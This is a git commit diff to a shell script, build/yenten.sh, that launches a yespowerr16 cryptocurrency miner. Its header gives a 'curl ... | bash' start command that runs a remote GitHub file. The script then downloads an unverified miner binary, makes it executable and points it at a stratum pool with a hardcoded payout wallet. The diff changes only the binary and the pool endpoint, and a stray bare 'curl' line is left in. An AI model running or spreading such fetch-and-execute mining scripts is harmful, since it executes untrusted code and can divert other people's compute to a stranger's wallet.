223945033fbb044c6359b2c61a1e29e737c47ef5
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2025-01-02 09:13:27 +0000

    ok

--- build/yenten.sh
+++ build/yenten.sh
@@ -2,6 +2,6 @@
 # Start CMD: curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/yenten |bash
 apt install curl wget -y
 curl 
-wget https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/avx2
+wget https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2
 chmod +x *
-./cp -a yespowerr16 -o stratum+tcp://stratum-asia.rplant.xyz:3383 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.gh
+./cp -a yespowerr16 -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.gh
